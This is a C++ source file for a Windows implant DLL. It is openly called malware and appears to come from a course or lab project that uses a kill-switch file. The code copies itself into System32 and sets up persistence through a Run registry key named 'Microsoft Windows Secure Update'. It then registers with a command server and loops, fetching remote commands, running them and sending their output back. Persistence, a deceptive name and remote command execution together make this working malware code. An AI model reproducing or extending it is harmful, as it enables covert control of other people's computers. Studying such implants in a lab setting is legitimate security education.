#include <windows.h>
#include <mmsystem.h>
#include "info.h"
#include <stdio.h>
#include <iostream>
#include <thread>
#include <http.h>
#include <communicationfuncs.h>

//For Persistence--------------------------------------------------------
//https://github.com/CoolerVoid/X_files/blob/master/src/automatically_run_proc_startup.cpp 
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <stdio.h>
#include <memory>

// run at 32bit and 64bit
#define KEY_WOW64_32KEY 0x0200
#define KEY_WOW64_64KEY 0x0100
#if defined(_WIN64)
 #define CROSS_ACCESS KEY_WOW64_32KEY
#else
 #define CROSS_ACCESS KEY_WOW64_64KEY
#endif
//For Persistence---------------------------------------------------------------


HMODULE DllHandle = NULL;


//stealer code ...

//Chonkycheck
bool chonkyCheck(){
    bool isChonkyPresent = false;
    wchar_t *fileName = L"C:\\malware\\ch0nky.txt"; //Check if this is the right way to include file: is it just chonky.txt or whole path??
    DWORD result = GetFileAttributesW(fileName);
    if(result != INVALID_FILE_ATTRIBUTES){
        //File is there
        isChonkyPresent = true;
        return isChonkyPresent;
    }
    //file is not there
    return isChonkyPresent; 
}

//Persistence
int persistentdll(){
    // copy program implant.dll to system32 directory
    wchar_t system2[MAX_PATH];
    wchar_t pathtofile[MAX_PATH];
    HMODULE ModPath = GetModuleHandle(NULL);
    GetModuleFileName(ModPath,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system2,sizeof(system2));
    wcscat(system2,L"\\implant.dll"); // program name at second argv
    CopyFile(pathtofile,system2,false);

    // write registry entries
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE | CROSS_ACCESS,&hKey );
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx
    RegSetValueEx(hKey, L"Microsoft Windows Secure Update",0,REG_SZ,(const unsigned char*)system2,sizeof(system2));
    RegCloseKey(hKey);

	return EXIT_SUCCESS;
}



void malware(){ //Like Patriotic()
    //First thing to do is check if Ch0nky file is there: if not--> exit program and don't inject, else--> continue
    bool chonkyPresence = chonkyCheck();
    if(chonkyPresence == false){ //Not sure if this would stop the reflective loader !!!
        //do nothing
        return;
    }
	//Call persistence
	persistentdll();

   //Register function
   //loop to get and send tasks
   while(!registerImplant()){
	   Sleep(1000);
   }
   while(true){

	   wchar_t *newCMD = getCMD();
	   if(newCMD != NULL){
		   wchar_t *output = runCMD(newCMD);
		   sendData(output);
	   }
   }


    return;
}


extern "C" _declspec(dllexport) int myMain(){ //Like Surprise

    malware(); //Like Patriotic

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

    // Fun fact, doing anything crazy in here will BREAK EVERYTHING YOU KNOW AND LOVE

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        ::MessageBoxA(NULL,"Look Ma!", "No Disk!", MB_OK );
        ::OutputDebugStringW(L"DLL_PROCESS_ATTACH");
        break; 

    case DLL_THREAD_ATTACH:
        ::OutputDebugStringW(L"DLL_THREAD_ATTACH");
        break;

    case DLL_THREAD_DETACH:
        ::OutputDebugStringW(L"DLL_THREAD_DETACH");
        break;

    case DLL_PROCESS_DETACH:
        ::OutputDebugStringW(L"DLL_PROCESS_DETACH");
        break;
    }

    return TRUE;
}